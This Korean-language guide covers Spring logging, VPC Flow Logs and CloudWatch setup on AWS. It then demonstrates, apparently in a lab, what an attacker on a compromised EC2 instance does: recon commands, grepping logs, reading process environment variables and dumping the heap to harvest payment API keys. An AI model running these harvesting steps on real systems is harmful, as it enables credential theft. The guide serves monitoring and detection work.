# 로그 수집 및 모니터링 설정 가이드

## 목차
1. [Spring 애플리케이션 로그 설정](#1-spring-애플리케이션-로그-설정)
2. [VPC Flow Logs 설정](#2-vpc-flow-logs-설정)
3. [CloudWatch Logs 설정](#3-cloudwatch-logs-설정)
4. [공격자가 NAT 아웃바운드 확인하는 과정](#4-공격자가-nat-아웃바운드-확인하는-과정)

---

## 1. Spring 애플리케이션 로그 설정

### 1.1 Logback 설정 파일 생성

**파일 위치**: `src/main/resources/logback-spring.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <!-- 콘솔 출력 -->
    <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
        <encoder>
            <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
        </encoder>
    </appender>

    <!-- 파일 출력 - 일반 로그 -->
    <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>/var/log/spring-app/application.log</file>
        <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>/var/log/spring-app/application-%d{yyyy-MM-dd}.log</fileNamePattern>
            <maxHistory>30</maxHistory>
        </rollingPolicy>
        <encoder>
            <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
        </encoder>
    </appender>

    <!-- 파일 출력 - PG API 호출 로그 (중요!) -->
    <appender name="PG_API_LOG" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>/var/log/spring-app/pg-api.log</file>
        <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>/var/log/spring-app/pg-api-%d{yyyy-MM-dd}.log</fileNamePattern>
            <maxHistory>90</maxHistory>
        </rollingPolicy>
        <encoder>
            <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level - %msg%n</pattern>
        </encoder>
    </appender>

    <!-- 파일 출력 - 보안 이벤트 로그 -->
    <appender name="SECURITY_LOG" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>/var/log/spring-app/security.log</file>
        <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>/var/log/spring-app/security-%d{yyyy-MM-dd}.log</fileNamePattern>
            <maxHistory>90</maxHistory>
        </rollingPolicy>
        <encoder>
            <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [SECURITY] %msg%n</pattern>
        </encoder>
    </appender>

    <!-- PG API 호출 로거 -->
    <logger name="com.security.test.service.PgApiService" level="INFO" additivity="false">
        <appender-ref ref="PG_API_LOG"/>
        <appender-ref ref="CONSOLE"/>
    </logger>

    <!-- Payment 관련 로거 -->
    <logger name="com.security.test.service.PaymentService" level="INFO" additivity="false">
        <appender-ref ref="PG_API_LOG"/>
        <appender-ref ref="CONSOLE"/>
    </logger>

    <logger name="com.security.test.controller.PaymentController" level="INFO" additivity="false">
        <appender-ref ref="PG_API_LOG"/>
        <appender-ref ref="CONSOLE"/>
    </logger>

    <!-- Root 로거 -->
    <root level="INFO">
        <appender-ref ref="CONSOLE"/>
        <appender-ref ref="FILE"/>
    </root>
</configuration>
```

### 1.2 로그 디렉토리 생성 (EC2 인스턴스)

```bash
# EC2 인스턴스에 접속 후
sudo mkdir -p /var/log/spring-app
sudo chown tomcat:tomcat /var/log/spring-app
sudo chmod 755 /var/log/spring-app
```

### 1.3 application.properties 로그 설정 추가

```properties
# 로그 파일 경로
logging.file.path=/var/log/spring-app
logging.file.name=/var/log/spring-app/application.log

# 로그 레벨
logging.level.root=INFO
logging.level.com.security.test=DEBUG
logging.level.com.security.test.service.PgApiService=INFO
logging.level.org.springframework.web=INFO

# 로그 패턴
logging.pattern.console=%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n
logging.pattern.file=%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n
```

---

## 2. VPC Flow Logs 설정

### 2.1 Terraform으로 VPC Flow Logs 생성

**파일**: `pj4_terraform/infrastructure/terraform/vpc_flow_logs.tf`

```hcl
# CloudWatch Log Group for VPC Flow Logs
resource "aws_cloudwatch_log_group" "vpc_flow_logs" {
  name              = "/aws/vpc/flowlogs/${var.project_name}"
  retention_in_days = 7

  tags = {
    Name        = "${var.project_name}-vpc-flow-logs"
    Environment = var.environment
  }
}

# IAM Role for VPC Flow Logs
resource "aws_iam_role" "vpc_flow_logs" {
  name = "${var.project_name}-vpc-flow-logs-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "vpc-flow-logs.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name = "${var.project_name}-vpc-flow-logs-role"
  }
}

# IAM Policy for VPC Flow Logs
resource "aws_iam_role_policy" "vpc_flow_logs" {
  name = "${var.project_name}-vpc-flow-logs-policy"
  role = aws_iam_role.vpc_flow_logs.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents",
          "logs:DescribeLogGroups",
          "logs:DescribeLogStreams"
        ]
        Resource = "*"
      }
    ]
  })
}

# VPC Flow Logs
resource "aws_flow_log" "main" {
  iam_role_arn    = aws_iam_role.vpc_flow_logs.arn
  log_destination = aws_cloudwatch_log_group.vpc_flow_logs.arn
  traffic_type    = "ALL"  # ACCEPT, REJECT, ALL
  vpc_id          = module.vpc.vpc_id

  tags = {
    Name        = "${var.project_name}-vpc-flow-log"
    Environment = var.environment
  }
}
```

### 2.2 VPC Flow Logs 포맷 설명

```
<version> <account-id> <interface-id> <srcaddr> <dstaddr> <srcport> <dstport> <protocol> <packets> <bytes> <start> <end> <action> <log-status>

예시:
2 123456789012 eni-1235b8ca123456789 10.0.1.5 54.239.28.85 49152 443 6 10 840 1626712313 1626712373 ACCEPT OK
```

**주요 필드**:
- `srcaddr`: 소스 IP (Private IP)
- `dstaddr`: 목적지 IP (Public IP)
- `srcport`: 소스 포트
- `dstport`: 목적지 포트 (443 = HTTPS)
- `action`: ACCEPT or REJECT

---

## 3. CloudWatch Logs 설정

### 3.1 CloudWatch Logs Agent 설치 (EC2)

```bash
# CloudWatch Logs Agent 다운로드 및 설치
wget https://s3.amazonaws.com/amazoncloudwatch-agent/amazon_linux/amd64/latest/amazon-cloudwatch-agent.rpm
sudo rpm -U ./amazon-cloudwatch-agent.rpm

# 설정 파일 생성
sudo mkdir -p /opt/aws/amazon-cloudwatch-agent/etc/
```

### 3.2 CloudWatch Agent 설정 파일

**파일**: `/opt/aws/amazon-cloudwatch-agent/etc/config.json`

```json
{
  "logs": {
    "logs_collected": {
      "files": {
        "collect_list": [
          {
            "file_path": "/var/log/spring-app/application.log",
            "log_group_name": "/aws/ec2/spring-app/application",
            "log_stream_name": "{instance_id}",
            "timezone": "UTC"
          },
          {
            "file_path": "/var/log/spring-app/pg-api.log",
            "log_group_name": "/aws/ec2/spring-app/pg-api",
            "log_stream_name": "{instance_id}",
            "timezone": "UTC"
          },
          {
            "file_path": "/var/log/messages",
            "log_group_name": "/aws/ec2/system/messages",
            "log_stream_name": "{instance_id}",
            "timezone": "UTC"
          },
          {
            "file_path": "/var/log/secure",
            "log_group_name": "/aws/ec2/system/secure",
            "log_stream_name": "{instance_id}",
            "timezone": "UTC"
          }
        ]
      }
    }
  },
  "metrics": {
    "namespace": "CWAgent",
    "metrics_collected": {
      "cpu": {
        "measurement": [
          {
            "name": "cpu_usage_idle",
            "rename": "CPU_IDLE",
            "unit": "Percent"
          }
        ],
        "metrics_collection_interval": 60
      },
      "disk": {
        "measurement": [
          {
            "name": "used_percent",
            "rename": "DISK_USED",
            "unit": "Percent"
          }
        ],
        "metrics_collection_interval": 60
      },
      "mem": {
        "measurement": [
          {
            "name": "mem_used_percent",
            "rename": "MEM_USED",
            "unit": "Percent"
          }
        ],
        "metrics_collection_interval": 60
      }
    }
  }
}
```

### 3.3 CloudWatch Agent 시작

```bash
# CloudWatch Agent 시작
sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -a fetch-config \
  -m ec2 \
  -s \
  -c file:/opt/aws/amazon-cloudwatch-agent/etc/config.json

# 상태 확인
sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -m ec2 \
  -a query
```

### 3.4 EC2 IAM Role에 권한 추가

```hcl
# Terraform - EC2에 CloudWatch Logs 권한 추가
resource "aws_iam_role_policy_attachment" "ec2_cloudwatch_logs" {
  role       = aws_iam_role.ec2_role.name
  policy_arn = "arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy"
}
```

---

## 4. 공격자가 NAT 아웃바운드 확인하는 과정

### 4.1 공격자가 EC2 인스턴스에 침투한 후

```bash
# ============================================
# STEP 1: 현재 네트워크 상태 확인
# ============================================

# 1. 현재 IP 주소 확인
ip addr show
# 출력 예시:
# eth0: inet 10.0.1.50/24  <- Private IP

# 2. 라우팅 테이블 확인
ip route show
# 출력 예시:
# default via 10.0.1.1 dev eth0  <- 기본 게이트웨이
# 10.0.1.0/24 dev eth0 proto kernel scope link src 10.0.1.50

# 3. 현재 Public IP 확인 (NAT를 통해 나가는지 확인)
curl -s ifconfig.me
curl -s http://checkip.amazonaws.com
# 출력 예시:
# 54.180.123.45  <- NAT Gateway의 Elastic IP

# ============================================
# STEP 2: 아웃바운드 연결 테스트
# ============================================

# 4. 외부 연결 테스트 (HTTPS)
curl -v https://api.example-pg.com/v1/payments 2>&1 | grep -i "connected\|trying"
# 출력 예시:
# * Trying 54.239.28.85:443...
# * Connected to api.example-pg.com (54.239.28.85) port 443

# 5. DNS 조회
nslookup api.example-pg.com
dig api.example-pg.com +short

# 6. 외부 HTTP 요청 (테스트용)
curl -I https://www.google.com
curl -I https://api.github.com

# ============================================
# STEP 3: 네트워크 트래픽 모니터링
# ============================================

# 7. 현재 연결 상태 확인
netstat -tuln
ss -tuln

# 8. 활성 연결 확인 (외부 연결 확인)
netstat -tun | grep ESTABLISHED
# 출력 예시:
# tcp   0   0 10.0.1.50:48392   54.239.28.85:443   ESTABLISHED

# 9. tcpdump로 패킷 캡처 (아웃바운드 HTTPS 트래픽)
sudo tcpdump -i eth0 -nn 'port 443' -c 20
# 출력 예시:
# 10.0.1.50.48392 > 54.239.28.85.443: Flags [S], seq 123456

# ============================================
# STEP 4: Spring 애플리케이션 로그 확인
# ============================================

# 10. PG API 호출 로그 확인
sudo tail -f /var/log/spring-app/pg-api.log
# 출력 예시:
# 2025-10-31 10:15:32.123 [http-nio-8080-exec-1] INFO  - === PG API 호출 시작 ===
# 2025-10-31 10:15:32.125 [http-nio-8080-exec-1] INFO  - PG API URL: https://api.example-pg.com/v1/payments
# 2025-10-31 10:15:32.130 [http-nio-8080-exec-1] INFO  - 요청 헤더: Authorization: Bearer test_sk_AB****3456
# 2025-10-31 10:15:32.145 [http-nio-8080-exec-1] INFO  - === PG API 응답 수신 (모의) ===

# 11. 전체 애플리케이션 로그에서 API 키 탐색
sudo grep -i "api.*key\|secret\|bearer" /var/log/spring-app/*.log
sudo grep -E "test_sk_|MID_" /var/log/spring-app/*.log

# 12. 실시간 로그 모니터링
sudo tail -f /var/log/spring-app/application.log | grep -i "payment\|pg"

# ============================================
# STEP 5: VPC Flow Logs 확인 (AWS CLI 필요)
# ============================================

# 13. AWS CLI로 VPC Flow Logs 조회
# (EC2에 IAM Role이 있고 AWS CLI 설치되어 있다면)
aws logs tail /aws/vpc/flowlogs/hyundai-project --follow --format short

# 특정 IP로의 연결 찾기
aws logs filter-pattern /aws/vpc/flowlogs/hyundai-project \
  --filter-pattern '[version, account, eni, source, dest="54.239.28.85", ...]' \
  --start-time $(date -u -d '10 minutes ago' +%s)000

# ============================================
# STEP 6: 프로세스 및 환경 변수 확인
# ============================================

# 14. Java 프로세스 확인
ps aux | grep java

# 15. Java 프로세스의 환경 변수 확인 (API 키 찾기)
JAVA_PID=$(pgrep -f 'java.*spring')
sudo cat /proc/$JAVA_PID/environ | tr '\0' '\n' | grep -i "api\|key\|secret"

# 16. Java 프로세스가 열고 있는 파일 확인
sudo lsof -p $JAVA_PID | grep -i "log\|properties"

# ============================================
# STEP 7: 메모리 덤프 (고급)
# ============================================

# 17. Java 힙 덤프 생성
JAVA_PID=$(pgrep -f 'java.*spring')
sudo jmap -dump:format=b,file=/tmp/heap.bin $JAVA_PID

# 18. 힙 덤프에서 API 키 찾기
strings /tmp/heap.bin | grep -E "test_sk_|api.*key|MID_"

# ============================================
# STEP 8: 네트워크 패킷 캡처 (상세)
# ============================================

# 19. HTTPS 연결 모니터링 (443 포트)
sudo tcpdump -i eth0 -nn -A 'host api.example-pg.com and port 443' -w /tmp/pg-traffic.pcap

# 20. 캡처된 패킷 분석
sudo tcpdump -r /tmp/pg-traffic.pcap -nn -X

# ============================================
# STEP 9: NAT Gateway 사용 확인
# ============================================

# 21. 라우팅 정보 확인
ip route get 8.8.8.8
# 출력 예시:
# 8.8.8.8 via 10.0.1.1 dev eth0 src 10.0.1.50

# 22. traceroute로 경로 확인
traceroute -n api.example-pg.com
# 출력 예시:
# 1  10.0.1.1 (NAT Gateway)
# 2  * * *
# 3  54.239.28.85

# 23. 외부에서 본 나의 IP (NAT Gateway IP)
curl -s http://ifconfig.me
curl -s http://ipinfo.io/ip
# 출력: NAT Gateway의 Elastic IP

# ============================================
# STEP 10: 시스템 로그 확인
# ============================================

# 24. 시스템 보안 로그
sudo tail -100 /var/log/secure
sudo tail -100 /var/log/auth.log  # Ubuntu/Debian

# 25. 최근 명령어 기록
history
sudo cat ~/.bash_history
```

### 4.2 공격자가 확인할 수 있는 정보 요약

**확인 가능한 정보:**

1. **Private IP**: `10.0.1.50` (EC2 인스턴스)
2. **Public IP** (NAT Gateway): `54.180.123.45`
3. **PG API 엔드포인트**: `https://api.example-pg.com` (`54.239.28.85`)
4. **API 키**: 로그나 메모리에서 `test_sk_ABCdefGHIjklMNOpqrSTUvwxYZ123456` 발견
5. **Merchant ID**: `MID_hyundai_20251031`
6. **아웃바운드 트래픽**: NAT Gateway를 통해 외부로 나가는 것 확인

### 4.3 VPC Flow Logs에서 보이는 것

```bash
# CloudWatch Logs Insights 쿼리 예시

# 특정 목적지 IP로의 연결 찾기
fields @timestamp, srcAddr, dstAddr, srcPort, dstPort, protocol, action
| filter dstAddr = "54.239.28.85"
| sort @timestamp desc
| limit 100

# HTTPS 트래픽 (포트 443) 필터링
fields @timestamp, srcAddr, dstAddr, srcPort, dstPort, action
| filter dstPort = 443
| filter action = "ACCEPT"
| sort @timestamp desc
| limit 100

# 특정 인스턴스의 아웃바운드 트래픽
fields @timestamp, srcAddr, dstAddr, dstPort, bytes
| filter srcAddr = "10.0.1.50"
| filter dstAddr not like "10.0."
| sort @timestamp desc
| limit 100
```

---

## 5. 공격 시나리오 시연 순서

### 5.1 준비 단계

```bash
# 1. EC2 인스턴스에 SSH 접속 (공격자가 이미 침투한 상황)
ssh -i key.pem ec2-user@<PUBLIC-IP>

# 2. root 권한 획득 (Spring4Shell 취약점 이용했다고 가정)
sudo su -
```

### 5.2 정보 수집

```bash
# 3. 네트워크 정보 수집
echo "=== 1. 현재 IP 주소 ==="
ip addr show | grep "inet "

echo "=== 2. NAT를 통한 Public IP ==="
curl -s http://checkip.amazonaws.com

echo "=== 3. 라우팅 테이블 ==="
ip route show

echo "=== 4. 외부 연결 테스트 ==="
curl -I https://www.google.com
```

### 5.3 API 키 탈취

```bash
# 5. 로그에서 API 키 찾기
echo "=== 5. PG API 로그 확인 ==="
tail -50 /var/log/spring-app/pg-api.log

echo "=== 6. API 키 검색 ==="
grep -r "test_sk_\|MID_" /var/log/spring-app/

# 7. 환경 변수 확인
JAVA_PID=$(pgrep -f 'java.*spring')
echo "=== 7. Java 프로세스 환경 변수 ==="
sudo cat /proc/$JAVA_PID/environ | tr '\0' '\n' | grep -i "key\|secret"
```

### 5.4 아웃바운드 확인

```bash
# 8. 실시간 네트워크 모니터링
echo "=== 8. 아웃바운드 연결 모니터링 ==="
sudo tcpdump -i eth0 -nn 'port 443' -c 10 &

# 9. PG API 호출 테스트 (결제 API 호출)
curl -X POST http://localhost:8080/api/payments \
  -H "Content-Type: application/json" \
  -d '{
    "rentalId": "test-rental-123",
    "amount": 50000,
    "currency": "KRW",
    "paymentMethod": "card",
    "customerName": "Test User",
    "customerEmail": "test@example.com"
  }'

# 10. 트래픽 캡처 결과 확인
wait
```

---

## 6. 로그 분석 도구

### 6.1 CloudWatch Logs Insights 쿼리

**PG API 호출 추적**:
```
fields @timestamp, @message
| filter @message like /PG API/
| sort @timestamp desc
| limit 100
```

**에러 로그 필터링**:
```
fields @timestamp, @message
| filter @message like /ERROR|Exception/
| sort @timestamp desc
| limit 50
```

**특정 시간대 트래픽**:
```
fields @timestamp, srcAddr, dstAddr, dstPort, bytes
| filter @timestamp > ago(1h)
| filter dstPort = 443
| stats sum(bytes) by dstAddr
```

---

## 7. 보안 권장 사항

1. **로그 암호화**: CloudWatch Logs에 KMS 암호화 적용
2. **로그 보존**: 최소 90일 이상 보관
3. **알람 설정**: 비정상적인 API 호출 감지
4. **GuardDuty**: 악성 IP 연결 탐지
5. **VPC Endpoint**: Secrets Manager, CloudWatch Logs 등을 VPC 내부로

---

**완료!** 이제 공격자가 NAT 게이트웨이를 통한 아웃바운드 트래픽을 어떻게 확인하는지 상세히 문서화했습니다.
